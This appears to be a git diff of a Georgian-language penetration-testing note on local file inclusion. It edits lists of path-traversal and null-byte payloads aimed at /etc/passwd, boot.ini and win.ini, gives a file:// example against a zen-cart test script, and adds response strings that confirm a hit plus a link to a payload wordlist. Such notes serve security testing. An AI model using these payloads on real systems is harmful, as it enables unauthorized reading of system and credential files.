@@ -27,16 +27,16 @@ open_basedir restriction in effect
 ```
 /..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
 ../../../../../../../../../../../../../../../etc/passwd
-/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd\x00
-/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd\x00.html
+/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00
+/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.html
 /etc/passwd
 ```
 
 შემდეგი სახის LFI - ის ტესტირება, როგორიცაა http://website/zen-cart/extras/curltest.php?url=file:///etc/passwd
 ```
 file:///etc/passwd
-/etc/passwd\x00
-/etc/passwd\x00.html
+/etc/passwd%00
+/etc/passwd%00.html
 /etc/passwd%00.ext
 /..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.ext
 ```
@@ -45,21 +45,28 @@ file:///etc/passwd
 ```
 /..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini
 ../../../../../../../../../../../../../../../boot.ini
-/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini\x00
-/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini\x00.html
+/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00
+/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00.html
 C:\\boot.ini
-C:\\boot.ini\0
-C:\\boot.ini\0.html
+C:\\boot.ini%00
+C:\\boot.ini%00.html
 %SYSTEMROOT%\\win.ini
-%SYSTEMROOT%\\win.ini\0
-%SYSTEMROOT%\\win.ini\0.html
+%SYSTEMROOT%\\win.ini%00
+%SYSTEMROOT%\\win.ini%00.html
 file:///C:/boot.ini
 file:///C:/win.ini
 C:\\boot.ini%00.ext
 %SYSTEMROOT%\\win.ini%00.ext
 ```
 ვაკვირდებით respons და ვეძებთ 
-Unix: ```root:x```
-Windows: ``` 16 bit```
+```
+root:x
+for 16-bit app support
+boot loader
+```
+
+სასურველი payload-ების ვორდლისტი
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders
+
 
 
